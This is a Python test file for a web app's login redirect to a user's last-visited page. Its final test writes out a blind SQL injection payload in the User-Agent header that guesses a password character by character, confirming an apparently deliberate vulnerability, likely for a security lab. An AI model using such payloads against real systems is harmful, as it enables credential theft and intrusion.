from tests.helpers import logged_in, logged_in_as, set_last_page


def test_default_to_index_when_no_last_page(client):
    username = 'alice'
    password = 'super_secret_password'
    with client:
        response = client.post("/login", data={
            "username": username,
            "password": password
        })
        # Should be redirected back to the index page
        assert response.status_code == 302
        assert logged_in()
        assert logged_in_as() == username
        assert response.location == "/"


def test_redirect_to_last_page_on_login(client):
    username = 'alice'
    password = 'super_secret_password'
    user_agent = 'test_agent'

    set_last_page(username, user_agent, "profile")

    with client:
        response = client.post("/login", data={
            "username": username,
            "password": password
        }, headers=[("User-Agent", user_agent)])
        # Should be redirected back to the last page
        assert response.status_code == 302
        assert logged_in()
        assert logged_in_as() == username
        assert response.location == "/profile"


def test_redirect_to_index_on_invalid_last_page(client):
    username = 'alice'
    password = 'super_secret_password'
    user_agent = 'test_agent'

    set_last_page(username, user_agent, "foobar")

    with client:
        response = client.post("/login", data={
            "username": username,
            "password": password
        }, headers=[("User-Agent", user_agent)])
        # Should be redirected back to the index page by default
        assert response.status_code == 302
        assert logged_in()
        assert logged_in_as() == username
        assert response.location == "/"


def test_blind_exploit(client):
    username = 'alice'
    password = 'super_secret_password'
    indicator_page = 'profile'
    good_guess_user_agent = f"spam_eggs' UNION SELECT '{indicator_page}' FROM Users WHERE username='{username}' AND password LIKE '{password[0]}%'-- "
    bad_guess_user_agent = f"spam_eggs' UNION SELECT '{indicator_page}' FROM Users WHERE username='{username}' AND password LIKE '{chr(ord(password[0]) + 1)}%'-- "

    with client:
        response = client.post("/login", data={
            "username": username,
            "password": password
        }, headers=[("User-Agent", good_guess_user_agent)])
        # Should be redirected back to the user-provided indicator page when query works
        assert response.status_code == 302
        assert logged_in()
        assert logged_in_as() == username
        assert response.location == f"/{indicator_page}"

        response = client.post("/login", data={
            "username": username,
            "password": password
        }, headers=[("User-Agent", bad_guess_user_agent)])
        # Converseley, should be redirected to the index page by default when the query doesn't work
        assert response.status_code == 302
        assert logged_in()
        assert logged_in_as() == username
        assert response.location == "/"
